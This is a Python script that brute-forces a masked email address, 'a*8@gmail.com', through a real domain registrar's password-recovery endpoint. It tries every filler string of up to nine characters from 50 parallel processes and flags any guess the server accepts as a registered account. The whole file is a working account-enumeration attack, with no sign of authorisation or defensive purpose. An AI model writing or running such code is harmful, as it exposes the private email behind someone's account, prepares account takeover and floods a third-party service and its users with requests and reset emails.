import requests
import itertools
from multiprocessing import Pool
import threading
import json

data = {
    'lx': 'find',
    'email': 'a*8@gmail.com',
}

# response = requests.post('https://www.gname.com/request/send_email', data=data) # ,cookies=cookies, headers=headers)
# print(response)
# print(response.text)
charset = 'abcdefghijklmnopqrstuvwxyz1234567890'
# print(list(itertools.product(charset, repeat=3)))

d = threading.local()
def set_num(counter):
    d.id = next(counter) + 1


def check_email(email_filler):
    email_filler = "".join(email_filler)
    data = {
        'lx': 'find',
        'email': f'a{email_filler}8@gmail.com',
    }

    response = requests.post('https://www.gname.com/request/send_email', data=data) # ,cookies=cookies, headers=headers)
    json_str = json.loads(response.text)
    valid = json_str["msg"][0] != "S"

    with open(f"./{threading.current_thread().ident}.txt", "a+", encoding="utf-8") as f:
        f.write(f"{email_filler}, {valid}\n")

    return valid, email_filler, json_str if valid else None
    # return d.id
    # print(d.id)

if __name__ == "__main__":
    # data = {
    #     'lx': 'find',
    #     'email': 'a*8@gmail.com',
    # }
    #
    # response = requests.post('https://www.gname.com/request/send_email', data=data) # ,cookies=cookies, headers=headers)
    # print(response.text)
    # input()
    with Pool(50) as pool:
        # print(list(pool.imap_unordered(check_email, [1, 2, 3, 4, 5])))
        for i in range(10):
            print(f"Starting length {i}...")
            task = itertools.product(charset, repeat=i)
            for valid, filler, text in pool.imap_unordered(check_email, task, chunksize=20 if i > 2 else 1):
                if valid:
                    print("FOUND RESULT")
                    print(filler)
                    print(text)
                    input()

